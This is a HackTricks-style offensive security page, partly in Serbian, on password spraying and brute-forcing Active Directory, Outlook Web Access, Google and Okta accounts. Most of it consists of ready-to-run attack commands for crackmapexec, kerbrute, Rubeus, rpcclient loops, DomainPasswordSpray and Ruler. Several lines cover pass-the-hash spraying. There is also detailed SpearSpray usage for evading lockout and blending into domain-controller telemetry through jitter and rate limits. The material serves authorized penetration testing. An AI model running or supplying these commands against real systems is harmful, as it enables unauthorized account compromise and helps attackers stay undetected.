# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Kada pronađete nekoliko **valid usernames** možete pokušati najčešće **common passwords** (imajte na umu password policy okruženja) sa svakim od otkrivenih korisnika.\
By **default** the **minimum** **password** **length** is **7**.

Liste common usernames takođe mogu biti korisne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Imajte na umu da **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Dobijte password policy

Ako imate neke user credentials ili shell kao domain user možete **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Eksploatacija sa Linuxa (ili sa bilo kog OS-a)

- Korišćenje **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Korišćenje [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(možete navesti broj pokušaja da izbegnete zaključavanja):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Koristeći [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIJE PREPORUČLJIVO, PONEKAD NE RADI
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Pomoću modula `scanner/smb/smb_login` iz **Metasploit**:

![](<../../images/image (745).png>)

- Pomoću **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Sa Windows-a

- Sa [Rubeus](https://github.com/Zer1t0/Rubeus) verzijom koja sadrži brute modul:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Sa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Može podrazumevano generisati users iz domaina i preuzeti password policy iz domaina i ograničiti pokušaje u skladu sa njom):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Sa [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying smanjuje šum u poređenju sa SMB/NTLM/LDAP bind pokušajima i bolje se uklapa u AD lockout policies. SpearSpray kombinuje LDAP-driven targeting, pattern engine i policy awareness (domain policy + PSOs + badPwdCount buffer) kako bi spray-ovao precizno i bezbedno. Takođe može označiti kompromitovane principe u Neo4j za BloodHound pathing.

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
- Throughput control with threads, jitter, and max requests per second.
- Optional Neo4j integration to mark owned users for BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Ciljanje i kontrola obrazaca:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth i sigurnosne kontrole:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound obogaćivanje:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pregled sistema šablona (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Dostupne promenljive uključuju:
- {name}, {samaccountname}
- Vremenske vrednosti iz pwdLastSet (ili whenCreated) svakog korisnika: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Pomoćni elementi za kompoziciju i org token: {separator}, {suffix}, {extra}

Operativne napomene:
- Preporučuje se da se upit šalje PDC-emulatoru pomoću -dc kako biste pročitali najautoritatnije badPwdCount i informacije vezane za politiku.
- Resetovanje badPwdCount se pokreće pri sledećem pokušaju nakon perioda posmatranja; koristite prag i tajming da ostanete bezbedni.
- Kerberos pre-auth pokušaji se pojavljuju kao 4768/4771 u DC telemetry; koristite jitter i rate-limiting da se uklopite.

> Savet: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Postoji više alata za p**assword spraying outlook**.

- Sa [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Sa [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Sa [Ruler](https://github.com/sensepost/ruler) (pouzdan!)
- Sa [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Sa [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Da biste koristili bilo koji od ovih alata, potreban vam je spisak korisnika i jedan password / mala lista passwords za spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Izvori

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)


{{#include ../../banners/hacktricks-training.md}}
